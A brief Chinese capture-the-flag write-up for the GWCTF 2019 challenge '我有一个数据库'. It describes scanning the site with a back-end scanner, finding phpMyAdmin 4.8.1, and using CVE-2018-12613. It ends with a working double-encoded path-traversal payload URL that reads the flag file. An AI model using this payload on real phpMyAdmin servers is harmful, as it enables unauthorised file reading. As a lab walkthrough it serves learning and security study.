# GWCTF 2019

## 我有一个数据库

> *2021/07/23*

### 题目

进去是一大堆乱码

![gwctf20191](img/gwctf2019/gwctf20191.png)

这种题先用`ctf-wsan`等后台扫描工具扫下后台，发现`phpinfo.php`以及`phpmyadmin`

![gwctf20192](img/gwctf2019/gwctf20192.png)

发现`phpmyadmin`是`4.8.1`的，存在**CVE-2018-12613**，直接利用

### payload

```
/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag
```

